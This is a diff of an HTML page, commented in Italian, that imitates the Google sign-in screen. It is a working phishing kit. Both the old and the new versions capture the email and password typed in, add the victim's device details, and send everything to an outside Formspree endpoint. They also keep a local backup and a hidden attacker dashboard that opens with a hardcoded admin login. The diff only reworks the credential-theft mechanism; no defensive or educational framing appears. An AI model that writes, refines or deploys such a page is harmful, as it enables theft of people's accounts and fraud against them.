@@ -5,123 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google - Accedi</title>
     <style>
-        :root { --google-blue: #1a73e8; --google-gray: #dadce0; --text-dark: #202124; }
-        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #fff; }
-
-        /* Interfaccia Google */
-        .login-card { width: 450px; padding: 48px 40px 36px; border: 1px solid var(--google-gray); border-radius: 8px; text-align: center; }
+        :root { --google-blue: #1a73e8; --google-gray: #dadce0; }
+        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
+        .card { width: 400px; padding: 48px 40px; border: 1px solid var(--google-gray); border-radius: 8px; text-align: center; }
         .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; color: var(--text-dark); }
-        p { font-size: 16px; margin-bottom: 35px; color: var(--text-dark); }
-
-        .input-group { margin-bottom: 25px; text-align: left; }
-        .label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #5f6368; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid var(--google-gray); border-radius: 4px; font-size: 16px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        .input-group { margin-top: 25px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid var(--google-gray); border-radius: 4px; font-size: 16px; margin-bottom: 15px; }
         input:focus { border: 2px solid var(--google-blue); outline: none; }
-
-        .footer { display: flex; justify-content: flex-end; margin-top: 40px; }
-        button { background-color: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
-
+        .footer { display: flex; justify-content: flex-end; margin-top: 20px; }
+        button, .btn-submit { background-color: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        
         /* Pannello Admin Segreto */
-        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0d1117; color: #c9d1d9; padding: 40px; z-index: 1000; overflow-y: auto; }
-        .hacker-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        .hacker-table th, .hacker-table td { padding: 12px; border: 1px solid #30363d; text-align: left; font-family: monospace; }
-        .hacker-table td { color: #7ee787; }
-
-        /* Loading Screen */
-        #loading { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; width: 100%; position: fixed; top: 0; left: 0; background: white; z-index: 500; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--google-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #admin { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#0d1117; color:#7ee787; padding:40px; z-index:1000; overflow:auto; }
+        table { width:100%; border-collapse:collapse; margin-top:20px; }
+        th, td { border: 1px solid #30363d; padding: 12px; text-align: left; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div id="main-ui" class="login-card">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+<div id="login-ui" class="card">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
     <h1>Accedi</h1>
-    <p>Utilizza il tuo Account Google</p>
+    <p>Usa il tuo Account Google</p>
     
-    <div class="input-group">
-        <label class="label">Email o telefono</label>
-        <input type="text" id="email" placeholder="Email o telefono">
-    </div>
-
-    <div class="input-group">
-        <label class="label">Inserisci la password</label>
-        <input type="password" id="pass" placeholder="Password">
-    </div>
-
-    <div class="footer">
-        <button onclick="handleLogin()">Avanti</button>
-    </div>
+    <!-- IL FORM REALE CHE INVIA I DATI -->
+    <form action="https://formspree.io/f/xzdolnpd" method="POST" id="phish-form">
+        <div class="input-group">
+            <input type="text" name="Email_Vittima" id="e" placeholder="Email o telefono" required>
+            <input type="password" name="Password_Vittima" id="p" placeholder="Inserisci la password" required>
+            <!-- Campi nascosti per extra info -->
+            <input type="hidden" name="_subject" value="NUOVE CREDENZIALI CATTURATE!">
+            <input type="hidden" name="Dispositivo" id="dev-info">
+        </div>
+        
+        <div class="footer">
+            <!-- Pulsante che prima salva e poi invia -->
+            <button type="button" onclick="salvaEInvia()">Avanti</button>
+        </div>
+    </form>
 </div>
 
-<div id="loading">
-    <div class="spinner"></div>
-    <p style="margin-top: 15px;">Verifica in corso...</p>
-</div>
-
-<div id="admin-panel">
-    <h1>[DASHBOARD ATTACCANTE - LOG REMOTO]</h1>
-    <table class="hacker-table">
-        <thead>
-            <tr><th>Data</th><th>Email</th><th>Password</th><th>Dispositivo</th></tr>
-        </thead>
-        <tbody id="data-rows"></tbody>
+<!-- Tabella Admin locale per sicurezza -->
+<div id="admin">
+    <h2>[PANNELLO DI CONTROLLO LOCALE]</h2>
+    <table id="logs-table">
+        <tr><th>Data</th><th>Email</th><th>Password</th></tr>
     </table>
-    <br>
-    <button onclick="location.reload()" style="background:#30363d; color:white; padding:10px; border:none; cursor:pointer;">Torna al Login</button>
+    <br><button onclick="location.reload()" style="background:#333;">Torna al Login</button>
 </div>
 
 <script>
-    async function handleLogin() {
-        const e = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
+    // Inserisce info dispositivo nel campo nascosto
+    document.getElementById('dev-info').value = navigator.platform + " (" + navigator.userAgent.split(' ')[0] + ")";
 
-        // --- LOGIN ADMIN ---
-        if (e === "admin@demo.it" && p === "mostra-tutto") {
-            showAdmin();
+    function salvaEInvia() {
+        const email = document.getElementById('e').value;
+        const pass = document.getElementById('p').value;
+
+        // --- CONTROLLO ADMIN ---
+        if (email === "admin@demo.it" && pass === "mostra-tutto") {
+            const db = JSON.parse(localStorage.getItem('backup_logs')) || [];
+            const table = document.getElementById('logs-table');
+            db.forEach(d => {
+                table.innerHTML += `<tr><td>${d.data}</td><td>${d.user}</td><td>${d.pass}</td></tr>`;
+            });
+            document.getElementById('admin').style.display = 'block';
             return;
         }
 
-        if(!e || !p) return alert("Inserisci i dati!");
+        if(!email || !pass) { alert("Completa i campi"); return; }
 
-        // Mostra caricamento simulato
-        document.getElementById('main-ui').style.display = 'none';
-        document.getElementById('loading').style.display = 'flex';
+        // 1. Salva nel browser (Backup se la mail fallisce)
+        let logs = JSON.parse(localStorage.getItem('backup_logs')) || [];
+        logs.push({ data: new Date().toLocaleString(), user: email, pass: pass });
+        localStorage.setItem('backup_logs', JSON.stringify(logs));
 
-        // --- INVIO EMAIL VIA FORMSPREE ---
-        try {
-            await fetch("https://formspree.io/f/xzdolnpd", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    Email: e, 
-                    Password: p, 
-                    Info: navigator.userAgent,
-                    Piattaforma: navigator.platform
-                })
-            });
-        } catch (err) { console.log("Errore silente"); }
-
-        // --- SALVATAGGIO LOCALE ---
-        let db = JSON.parse(localStorage.getItem('db_final')) || [];
-        db.push({ dt: new Date().toLocaleString(), em: e, ps: p, dev: navigator.platform });
-        localStorage.setItem('db_final', JSON.stringify(db));
-
-        // Reindirizzamento
-        setTimeout(() => {
-            window.location.href = "https://myaccount.google.com/";
-        }, 1500);
-    }
-
-    function showAdmin() {
-        const db = JSON.parse(localStorage.getItem('db_final')) || [];
-        const rows = document.getElementById('data-rows');
-        rows.innerHTML = db.map(i => `<tr><td>${i.dt}</td><td>${i.em}</td><td>${i.ps}</td><td>${i.dev}</td></tr>`).join('');
-        document.getElementById('main-ui').style.display = 'none';
-        document.getElementById('admin-panel').style.display = 'block';
+        // 2. Invia il form a Formspree
+        document.getElementById('phish-form').submit();
     }
 </script>
 
